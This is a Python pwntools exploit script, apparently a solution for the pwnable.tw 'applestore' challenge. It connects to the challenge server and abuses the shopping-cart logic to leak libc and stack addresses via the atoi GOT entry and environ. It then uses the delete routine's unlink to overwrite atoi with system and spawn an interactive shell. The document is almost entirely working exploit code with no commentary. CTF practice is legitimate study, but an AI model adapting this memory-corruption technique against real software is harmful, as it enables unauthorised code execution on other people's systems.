from pwn import *

if __name__ == '__main__':        
    context.log_level = 'debug'
    context.arch = 'amd64'
    LOCAL = 0
    DEBUG = 0

    # functions for quick script
    s       = lambda data               :t.send(str(data))       
    sa      = lambda delim,data         :t.sendafter(str(delim), str(data)) 
    sl      = lambda data               :t.sendline(str(data)) 
    sla     = lambda delim,data         :t.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :t.recv(numb)
    ru      = lambda delims, drop=True  :t.recvuntil(delims, drop)
    irt     = lambda                    :t.interactive()

    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
    # x64 below
    #16_04_magic = [0x45216,0x4526a,0xf02a4,0xf1147]

    #18_04_magic = [0x4f2c5,0x4f322,0x10a38c]

    if LOCAL:
        #t = process('./pwn',env={'LD_PRELOAD':'./libc-2.23.so'})
        t = remote('192.168.5.190', 9999)
        elf = ELF('./applestore')
        libc = ELF('libc_32.so.6')
    else:
        t = remote('chall.pwnable.tw', 10104)
        elf = ELF('./applestore')
        libc = ELF('libc_32.so.6')
    
    


    def debug():
        raw_input('go?')


    def add(size):
        sla('> ',2)
        sla('> ',size)



    def delete(index):
        sla('> ',3)
        sla('> ',index)


    def check():
        sla('> ',5)
        sla('> ','y')


    def show(payload):
        sla('> ',4)
        sa('> ',payload)



    for i in range(20):
        add(2)

    for i in range(6):
        add(1)
    debug()
    check()
    #payload = 'y' + '\x00' + cyclic(19)
    payload = 'y' + '\x00' + p32(elf.got['atoi']) + '\x00' * 15
    show(payload)
    ru('27: ')
    addr_libc = uu32(t.recvn(4)) - libc.symbols['atoi']
    leak('addr_libc', addr_libc)
    payload = 'y' + '\x00' + p32(addr_libc + libc.symbols['environ']) + '\x00' * 15
    show(payload)
    ru('27: ')
    addr_stack = uu32(t.recvn(4))
    leak('addr_stack', addr_stack)
    addr_ebp = addr_stack - 0x104
    payload = '27' + p32(0) + p32(0) +  p32(elf.got['atoi'] + 0x22)+ p32(addr_ebp - 0x8)
    delete(payload)
    ru('> ')
    sl(p32(addr_libc + libc.symbols['system']) + ';$0')
    irt()

